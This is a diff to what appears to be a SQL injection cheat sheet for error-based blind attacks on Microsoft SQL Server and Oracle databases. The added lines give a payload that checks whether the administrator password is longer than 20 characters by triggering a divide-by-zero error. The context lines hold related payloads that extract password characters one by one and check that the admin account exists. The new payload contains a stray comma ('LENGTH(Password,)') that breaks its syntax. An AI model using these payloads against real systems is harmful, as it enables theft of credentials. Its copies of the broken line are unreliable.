@@ -14,6 +14,10 @@ xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1
 xyz' AND 1/0--
 ```
 - Always returns 1/0 error
+```
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND LENGTH(Password,) > 20) THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+- Password length is greater than 20
 # Oracle
 ```
 ' AND (SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator')='administrator') THEN TO_CHAR(1/0) ELSE 'b' END FROM dual)='b'--
